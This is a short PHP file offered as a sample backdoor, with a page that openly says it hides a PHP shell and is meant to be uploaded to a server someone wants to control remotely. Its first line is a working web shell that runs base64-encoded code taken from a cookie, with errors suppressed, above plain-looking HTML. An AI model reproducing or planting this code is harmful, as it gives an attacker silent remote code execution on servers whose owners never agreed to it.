<?php $f=create_function("",base64_decode(@$_COOKIE["z"]));@$f(); ?>
<html>
    <head></head>
    <body>
        <h1>This script has hidden php shell!</h1>
        <p>Example of script that should be uploaded to server you wish to control remotely.</p>
    </body>

</html>
